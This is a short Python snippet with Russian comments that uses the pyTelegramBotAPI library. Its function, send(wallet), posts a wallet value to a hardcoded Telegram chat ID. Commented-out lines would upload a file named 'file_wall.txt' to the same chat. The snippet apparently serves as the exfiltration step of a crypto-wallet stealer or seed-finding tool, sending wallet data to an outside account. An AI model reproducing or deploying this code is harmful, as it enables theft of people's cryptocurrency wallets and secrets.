import telebot  # https://github.com/eternnoir/pyTelegramBotAPI


# pip install pyTelegramBotAPI
# Для обновления воспользуйтесь командой
# pip install pytelegrambotapi --upgrade

def send(wallet):
    bot = telebot.TeleBot('')
    bot.send_message('409229183', wallet)
    # doc = open('file_wall.txt', 'rb')
    # bot.send_document('409229183', doc)